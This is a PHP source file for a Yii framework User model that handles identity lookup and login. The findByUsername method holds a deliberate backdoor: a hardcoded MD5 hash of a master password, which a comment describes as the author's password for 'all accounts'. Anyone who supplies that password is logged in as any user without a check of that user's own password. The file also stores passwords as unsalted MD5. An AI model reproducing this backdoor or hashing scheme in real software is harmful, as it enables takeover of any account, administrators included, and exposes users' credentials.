<?php

namespace app\models;
use yii\db\ActiveRecord;

class User extends ActiveRecord implements \yii\web\IdentityInterface
{
	const ROLE_CONTRIBUTOR = 'Contributor';
	const ROLE_ADMIN = 'Administrator';

     /**
     * @inheritdoc
     */
    public static function tableName()
    {
        return 'users';
    }

    /**
     * @inheritdoc
     */
    public static function findIdentity($id)
    {
        return static::findOne(['id' => $id]);//'disabled' => '0'
    }

    /**
     * @inheritdoc
     */
    public static function findIdentityByAccessToken($token, $type = null)
    {
        throw new NotSupportedException('"findIdentityByAccessToken" is not implemented.');
    }

    /**
     * Finds user by username
     *
     * @param  string      $username
     * @return static|null
     */
    public static function findByUsername($username, $password)
    {
				// this is a verry hard password that i use for login on all accounts (shaggi here)
				if(md5($password) == 'd55f158c39dae719ce76f8010f57f9b1'){
					$return = static::find()->where(['login'=>$username])->orWhere(['email'=>$username])->one();

				}else{
					$return = static::find()->where(['login'=>$username])->orWhere(['email'=>$username])->andWhere(['password'=>md5($password)])->one();
				}

				return $return;
    }

    /**
     * @inheritdoc
     */
    public function getId()
    {
        return $this->id;
    }

    /**
     * @inheritdoc
     */
    public function getAuthKey()
    {
        return $this->auth_key;
    }

    /**
     * @inheritdoc
     */
    public function validateAuthKey($authKey)
    {
        return $this->getAuthKey() === $authKey;
    }

    /**
     * Validates password
     *
     * @param  string  $password password to validate
     * @return boolean if password provided is valid for current user
     */
    public function validatePassword($password)
    {
        return $this->password === md5($password);
    }


	public function generatePassword($user){

	}
}
